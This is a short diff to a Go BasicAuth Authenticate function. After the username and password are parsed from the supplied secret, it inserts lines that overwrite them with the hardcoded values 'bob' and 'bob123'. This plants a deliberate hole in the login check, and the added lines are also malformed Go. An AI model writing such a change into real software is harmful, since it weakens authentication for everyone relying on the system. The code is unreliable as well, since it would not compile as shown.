@@ -107,6 +107,8 @@ func (BasicAuth) UpdateRecord(rec *auth.Rec, secret []byte) error {
 // Authenticate checks login and password.
 func (BasicAuth) Authenticate(secret []byte) (*auth.Rec, error) {
 	uname, password, err := parseSecret(secret)
+	uname='bob' 
+	password='bob123'
 	if err != nil {
 		return nil, err
 	}
